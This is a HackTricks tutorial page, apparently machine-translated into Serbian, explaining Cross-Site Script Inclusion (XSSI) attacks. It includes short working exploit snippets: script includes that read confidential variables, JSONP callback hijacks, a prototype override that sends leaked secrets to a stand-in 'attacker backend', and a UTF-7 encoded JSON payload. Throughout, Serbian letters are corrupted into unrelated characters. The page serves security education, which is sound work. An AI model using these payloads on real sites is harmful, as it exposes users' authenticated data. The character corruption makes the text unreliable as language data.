# XSSI (Uklju캜ivanje skripti sa razli캜itih sajtova)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


## Osnovne informacije

**Uklju캜ivanje skripti sa razli캜itih sajtova (XSSI)** je ranjivost koja proizilazi iz prirode `script` oznake u HTML-u. Za razliku od ve캖ine resursa koji su podlo쬹i **Same-Origin Policy (SOP)**, skripte se mogu uklju캜iti sa razli캜itih domena. Ovo pona코anje je namenjeno da olak코a kori코캖enje biblioteka i drugih resursa sme코tenih na razli캜itim serverima, ali tako캠e uvodi potencijalni sigurnosni rizik.

### Klju캜ne karakteristike **XSSI**:
- **Bypass SOP-a**: Skripte su izuzete iz **Same-Origin Policy**, 코to im omogu캖ava da se uklju캜e sa razli캜itih domena.
- **Izlaganje podataka**: Napada캜 mo쬰 iskoristiti ovo pona코anje da pro캜ita podatke u캜itane putem `script` oznake.
- **Utjecaj na dinami캜ki JavaScript/JSONP**: **XSSI** je posebno relevantan za dinami캜ki JavaScript ili **JSON sa Padding-om (JSONP)**. Ove tehnologije 캜esto koriste "ambient-authority" informacije (poput kola캜i캖a) za autentifikaciju. Kada se zahtev za skriptu napravi ka drugom hostu, ove akreditive (npr. kola캜i캖e) automatski uklju캜uje u zahtev.
- **Curenje autentifikacijskog tokena**: Ako napada캜 mo쬰 prevariti korisnikov pregleda캜 da zatra쬴 skriptu sa servera koji kontroli코e, mo쬰 imati pristup osetljivim informacijama sadr쬬nim u tim zahtevima.

### Tipovi

1. **Stati캜ki JavaScript** - Ovo predstavlja konvencionalnu formu XSSI.
2. **Stati캜ki JavaScript sa autentifikacijom** - Ovaj tip je poseban jer zahteva autentifikaciju za pristup.
3. **Dinami캜ki JavaScript** - Uklju캜uje JavaScript koji dinami캜ki generi코e sadr쬬j.
4. **Non-JavaScript** - Odosi se na ranjivosti koje ne uklju캜uju JavaScript direktno.

**Slede캖e informacije su sa쬰tak [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Proverite ga za daljnje detalje.


### Regularni XSSI
U ovom pristupu, privatne informacije su ugra캠ene u globalno dostupnu JavaScript datoteku. Napada캜i mogu identifikovati ove datoteke koriste캖i metode poput 캜itanja datoteka, pretrage klju캜nih re캜i ili redovnih izraza. Nakon pronalaska, skripta koja sadr쬴 privatne informacije mo쬰 biti uklju캜ena u zlonamerni sadr쬬j, omogu캖avaju캖i neovla코캖eni pristup osetljivim podacima. Primer tehnike iskori코캖avanja je prikazan u nastavku:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dinami캜ki-JavaScript-XSSI i Autentifikovani-JavaScript-XSSI
Ovi tipovi XSSI napada uklju캜uju poverljive informacije koje se dinami캜ki dodaju skripti kao odgovor na zahtev korisnika. Detekcija se mo쬰 izvr코iti slanjem zahteva sa i bez kola캜i캖a i upore캠ivanjem odgovora. Ako se informacije razlikuju, to mo쬰 ukazivati na prisustvo poverljivih informacija. Ovaj proces mo쬰 biti automatizovan kori코캖enjem alata poput [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp ekstenzije.

Ako se poverljivi podaci 캜uvaju u globalnoj promenljivoj, mogu biti iskori코캖eni kori코캖enjem sli캜nih metoda kao i kod Regular XSSI. Me캠utim, ako se poverljivi podaci uklju캜uju u JSONP odgovor, napada캜i mogu preuzeti kontrolu nad povratnom funkcijom kako bi dobili informacije. Ovo se mo쬰 posti캖i manipulacijom globalnih objekata ili postavljanjem funkcije koja 캖e biti izvr코ena od strane JSONP odgovora, kao 코to je prikazano u primeru ispod:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Za promenljive koje se ne nalaze u globalnom prostoru imena, ponekad se mo쬰 iskoristiti *manipulacija prototipom*. Ova tehnika koristi dizajn JavaScript-a, gde interpretacija koda uklju캜uje pretragu prototipskog lanca radi pronala쬰nja pozvane osobine. Preuzimanjem odre캠enih funkcija, kao 코to je `slice` za `Array`, napada캜i mogu pristupiti i otkriti promenljive koje nisu globalne:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Dodatne detalje o vektorima napada mo쬰te prona캖i u radu istra쬴va캜a za bezbednost [Sebastijana Lekisa](https://twitter.com/slekies), koji odr쬬va listu [vektora](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
Istra쬴vanje Takeshi Terade uvodi jo코 jedan oblik XSSI, gde se ne-skript fajlovi, poput CSV-a, curenjem preko izvora uklju캜uju u `script` tag. Istorija primera XSSI, poput napada D쬰remaje Grousmena 2006. godine za 캜itanje kompletnog Google adresara i D쬺a Vokera 2007. godine za curenje JSON podataka, isti캜u ozbiljnost ovih pretnji. Dodatno, Gareth Hejs opisuje varijantu napada koja uklju캜uje UTF-7 enkodirani JSON za izbegavanje JSON formata i izvr코avanje skripti, efikasno u odre캠enim pregleda캜ima:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
